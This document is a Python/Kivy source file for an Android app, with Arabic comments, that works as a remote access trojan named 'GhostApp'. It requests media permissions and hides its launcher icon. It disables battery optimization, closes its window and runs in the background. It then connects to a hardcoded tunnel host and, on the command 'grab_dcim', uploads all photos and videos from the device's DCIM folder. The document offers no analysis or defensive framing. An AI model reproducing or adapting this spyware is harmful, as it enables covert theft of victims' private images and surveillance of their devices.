import os
import sys
import socket
import struct
import time
import threading
from kivy.app import App
from kivy.uix.widget import Widget
from kivy.core.window import Window
from kivy.clock import Clock

# استيراد مكتبات أندرويد المتقدمة
try:
    from android.permissions import request_permissions, Permission
    from jnius import autoclass
    HAS_ANDROID = True
except ImportError:
    HAS_ANDROID = False

HOST = 'mptv5iun19.localto.net'
PORT =  2655
DCIM_PATH = '/storage/emulated/0/DCIM/'

class InvisibleWidget(Widget):
    pass

class GhostApp(App):
    def build(self):
        Window.bind(on_request_close=self.on_request_close)
        return InvisibleWidget()

    def on_request_close(self, *args):
        return False

    def on_pause(self):
        return True

def hide_app_icon():
    if not HAS_ANDROID: return
    try:
        PythonActivity = autoclass('org.kivy.android.PythonActivity')
        context = PythonActivity.mActivity
        package_name = context.getPackageName()

        pm = context.getPackageManager()
        # إخفاء الأيقونة من الـ Launcher
        pm.setComponentEnabledSetting(
            pm.getLaunchIntentForPackage(package_name).getComponent(),
            pm.COMPONENT_ENABLED_STATE_DISABLED,
            pm.DONT_KILL_APP
        )
    except Exception:
        pass

def disable_battery_optimization():
    if not HAS_ANDROID: return
    try:
        PythonActivity = autoclass('org.kivy.android.PythonActivity')
        context = PythonActivity.mActivity
        Intent = autoclass('android.content.Intent')
        Settings = autoclass('android.provider.Settings')

        intent = Intent()
        intent.setAction(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS)
        intent.setData(android.net.Uri.parse(f"package:{context.getPackageName()}"))
        context.startActivity(intent)
    except Exception:
        pass

def request_perms_and_hide(dt):
    try:
        if HAS_ANDROID:
            # صلاحيات أندرويد 13+ للصور والفيديوهات
            request_permissions([
                Permission.READ_MEDIA_IMAGES,
                Permission.READ_MEDIA_VIDEO,
                Permission.INTERNET,
                Permission.ACCESS_NETWORK_STATE,
                Permission.FOREGROUND_SERVICE
            ])

            # تأخير بسيط لضمان تطبيق الصلاحيات في النظام
            time.sleep(1)

            # إخفاء التطبيق من قائمة التطبيقات
            hide_app_icon()

            # محاولة تعطيل تقييد البطارية (لمنع القتل من النظام)
            disable_battery_optimization()

            # إغلاق الواجهة الرسومية بالكامل وترك السكريبت يعمل في الخلفية
            Window.close()

    except Exception:
        try:
            Window.close()
        except Exception:
            pass

    # إطلاق الاتصال في خيط منفصل بعد إغلاق الواجهة
    threading.Thread(target=start_rat_core, daemon=True).start()

def start_rat_core():
    sock = None
    while True:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(15)
            sock.connect((HOST, PORT))

            cmd = "HANDSHAKE"
            sock.sendall(struct.pack('!I', len(cmd)) + cmd.encode('utf-8'))

            while True:
                raw_len = recv_exact(sock, 4)
                if not raw_len: break

                msg_len = struct.unpack('!I', raw_len)[0]
                if msg_len == 0: continue

                data = recv_exact(sock, msg_len).decode('utf-8')
                if not data: break

                if data == "grab_dcim":
                    send_dcim_files(sock)

        except Exception:
            if sock:
                try: sock.close()
                except: pass
            time.sleep(10)

def recv_exact(sock, n):
    data = b''
    while len(data) < n:
        packet = sock.recv(n - len(data))
        if not packet: return None
        data += packet
    return data

def send_dcim_files(sock):
    if not os.path.exists(DCIM_PATH): return

    for root, dirs, files in os.walk(DCIM_PATH):
        for file in files:
            if file.lower().endswith(('.jpg', '.jpeg', '.png', '.mp4')):
                file_path = os.path.join(root, file)
                try:
                    cmd = f"FILE_START|{file}"
                    sock.sendall(struct.pack('!I', len(cmd)) + cmd.encode('utf-8'))

                    file_size = os.path.getsize(file_path)
                    sock.sendall(struct.pack('!I', file_size))

                    with open(file_path, 'rb') as f:
                        while True:
                            chunk = f.read(4096)
                            if not chunk: break
                            sock.sendall(chunk)

                    end_cmd = "FILE_END"
                    sock.sendall(struct.pack('!I', len(end_cmd)) + end_cmd.encode('utf-8'))
                except Exception:
                    continue

if __name__ == '__main__':
    app = GhostApp()
    Clock.schedule_once(request_perms_and_hide, 0.5)
    app.run()